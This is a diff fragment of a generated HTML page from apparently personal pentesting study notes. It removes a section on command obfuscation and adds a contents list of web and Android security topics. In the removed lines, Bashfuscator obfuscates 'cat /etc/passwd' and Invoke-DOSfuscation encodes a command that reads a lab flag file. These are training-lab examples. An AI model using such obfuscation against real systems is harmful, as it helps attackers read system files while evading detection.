-</span><span id="__span-0-2"><span class="nb">cd</span><span class="w"> </span>Bashfuscator
-</span><span id="__span-0-3">pip3<span class="w"> </span>install<span class="w"> </span><span class="nv">setuptools</span><span class="o">==</span><span class="m">65</span>
-</span><span id="__span-0-4">python3<span class="w"> </span>setup.py<span class="w"> </span>install<span class="w"> </span>--user
-</span><span id="__span-0-5"><span class="nb">cd</span><span class="w"> </span>./bashfuscator/bin/
-</span><span id="__span-0-6">./bashfuscator<span class="w"> </span>-h<span class="w"> </span><span class="c1">## show help screen</span>
-</span><span id="__span-0-7">./bashfuscator<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;cat /etc/passwd&#39;</span><span class="w"> </span><span class="c1">## random choice obfuscation technique</span>
-</span><span id="__span-0-8">./bashfuscator<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;cat /etc/passwd&#39;</span><span class="w"> </span>-s<span class="w"> </span><span class="m">1</span><span class="w"> </span>-t<span class="w"> </span><span class="m">1</span><span class="w"> </span>--no-mangling<span class="w"> </span>--layers<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="c1">## short and simple obfuscated command</span>
-</span></code></pre></div></td></tr></table></div>
-<h3 id="windows-dosfuscation">Windows (DOSfuscation)</h3>
-<p>https://github.com/danielbohannon/Invoke-DOSfuscation</p>
-<div class="language-PowerShell highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PowerShell</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
-<span class="normal">2</span>
-<span class="normal">3</span>
-<span class="normal">4</span>
-<span class="normal">5</span>
-<span class="normal">6</span>
-<span class="normal">7</span>
-<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">danielbohannon</span><span class="p">/</span><span class="nb">Invoke-DOSfuscation</span><span class="p">.</span><span class="n">git</span>
-</span><span id="__span-1-2"><span class="nb">cd Invoke-DOSfuscation</span>
-</span><span id="__span-1-3"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-DOSfuscation</span><span class="p">.</span><span class="n">psd1</span>
-</span><span id="__span-1-4"><span class="nb">Invoke-DOSfuscation</span>
-</span><span id="__span-1-5"><span class="nb">Invoke-DOSfuscation</span><span class="p">&gt;</span> <span class="n">help</span> <span class="c">## show help screen</span>
-</span><span id="__span-1-6"><span class="nb">Invoke-DOSfuscation</span><span class="p">&gt;</span> <span class="nb">SET </span><span class="n">COMMAND</span> <span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">htb-student</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
-</span><span id="__span-1-7"><span class="nb">Invoke-DOSfuscation</span><span class="p">&gt;</span> <span class="n">encoding</span>
-</span><span id="__span-1-8"><span class="nb">Invoke-DOSfuscation</span><span class="p">\</span><span class="n">Encoding</span><span class="p">&gt;</span> <span class="n">1</span> <span class="c">## encode type 1 </span>
-</span></code></pre></div></td></tr></table></div>
-<p>Run windows powershell on linux with <a href="https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-linux?view=powershell-7.5">pwsh</a></p>
+<h1 id="study-notes-contents">Study Notes Contents</h1>
+<h2 id="bug-bounty-hunting">Bug Bounty Hunting</h2>
+<ul>
+<li><a href="study-notes/owasp-top-10-2025.md">OWASP Top 10 2025</a></li>
+<li><a href="study-notes/reconnaissance.md">Reconnaissance</a></li>
+<li><a href="study-notes/reporting-and-poc.md">Reporting &amp; POC</a></li>
+<li><a href="study-notes/tech-interview-prep.md">Tech Interview Prep</a></li>
+</ul>
+<h2 id="bscp-study-notes">BSCP Study Notes</h2>
+<ul>
+<li><a href="study-notes/bscp-study-notes/index.md">Overview</a></li>
+<li><a href="study-notes/bscp-study-notes/authentication-vulnerabilities.md">Authentication Vulnerabilities</a></li>
+<li><a href="study-notes/bscp-study-notes/business-logic-vulnerabilities.md">Business Logic Vulnerabilities</a></li>
+<li><a href="study-notes/bscp-study-notes/command-injection.md">Command Injection</a></li>
+<li><a href="study-notes/bscp-study-notes/cross-site-scripting.md">Cross-Site Scripting</a></li>
+<li><a href="study-notes/bscp-study-notes/path-traversal.md">Path Traversal</a></li>
+<li><a href="study-notes/bscp-study-notes/sql-injection.md">SQL Injection</a></li>
+</ul>
+<h2 id="cwee-study-notes">CWEE Study Notes</h2>
+<ul>
+<li><a href="study-notes/cwee-study-notes/index.md">Overview</a></li>
+<li><a href="study-notes/cwee-study-notes/attacking-authentication-mechanisms.md">Attacking Authentication Mechanisms</a></li>
+<li><a href="study-notes/cwee-study-notes/injection-attacks.md">Injection Attacks</a></li>
+<li><a href="study-notes/cwee-study-notes/introduction-to-nosql-injection.md">Introduction to NoSQL Injection</a></li>
+<li><a href="study-notes/cwee-study-notes/intro-to-whitebox-pentesting.md">Intro to Whitebox Pentesting</a></li>
+</ul>
+<h2 id="cwes-study-notes">CWES Study Notes</h2>
+<ul>
+<li><a href="study-notes/cwes-study-notes/api-attacks.md">API Attacks</a></li>
+<li><a href="study-notes/cwes-study-notes/attacking-common-applications.md">Attacking Common Applications</a></li>
+<li><a href="study-notes/cwes-study-notes/attacking-graphql.md">Attacking GraphQL</a></li>
+<li><a href="study-notes/cwes-study-notes/attacking-web-applications-with-ffuf.md">Attacking Web Applications with Ffuf</a></li>
+<li><a href="study-notes/cwes-study-notes/broken-authentication.md">Broken Authentication</a></li>
+<li><a href="study-notes/cwes-study-notes/command-injections.md">Command Injections</a></li>
+<li><a href="study-notes/cwes-study-notes/cross-site-scripting-(xss).md">Cross-Site Scripting (XSS)</a></li>
+<li><a href="study-notes/cwes-study-notes/file-inclusion.md">File Inclusion</a></li>
+<li><a href="study-notes/cwes-study-notes/file-upload-attacks.md">File Upload Attacks</a></li>
+<li><a href="study-notes/cwes-study-notes/hacking-wordpress.md">Hacking WordPress</a></li>
+<li><a href="study-notes/cwes-study-notes/javascript-deobfuscation.md">JavaScript Deobfuscation</a></li>
+<li><a href="study-notes/cwes-study-notes/login-brute-forcing.md">Login Brute Forcing</a></li>
+<li><a href="study-notes/cwes-study-notes/server-side-attacks.md">Server-Side Attacks</a></li>
+<li><a href="study-notes/cwes-study-notes/session-security.md">Session Security</a></li>
+<li><a href="study-notes/cwes-study-notes/sql-injection-fundamentals.md">SQL Injection Fundamentals</a></li>
+<li><a href="study-notes/cwes-study-notes/sqlmap-essentials.md">SQLMap Essentials</a></li>
+<li><a href="study-notes/cwes-study-notes/web-attacks.md">Web Attacks</a></li>
+<li><a href="study-notes/cwes-study-notes/web-fuzzing.md">Web Fuzzing</a></li>
+<li><a href="study-notes/cwes-study-notes/web-service-and-api-attacks.md">Web Service &amp; API Attacks</a></li>
+</ul>
+<h2 id="android-application-pentesting">Android Application Pentesting</h2>
+<ul>
+<li><a href="study-notes/android-application-pentesting/index.md">Overview</a></li>
+<li><a href="study-notes/android-application-pentesting/android-fundamentals.md">Android Fundamentals</a></li>
+<li><a href="study-notes/android-application-pentesting/android-application-static-analysis.md">Android Application Static Analysis</a></li>
+<li><a href="study-notes/android-application-pentesting/android-application-dynamic-analysis.md">Android Application Dynamic Analysis</a></li>
+</ul>
+<h2 id="tools-and-protocols">Tools and Protocols</h2>
+<ul>
+<li><a href="study-notes/tools-and-protocols/curl.md">cURL</a></li>
+<li><a href="study-notes/tools-and-protocols/ftp.md">ftp</a></li>
+<li><a href="study-notes/tools-and-protocols/gobuster.md">gobuster</a></li>
+<li><a href="study-notes/tools-and-protocols/nmap.md">nmap</a></li>
+</ul>
 
 
 
@@ -2688,10 +2313,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["content.code.copy"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
       
     
   </body>
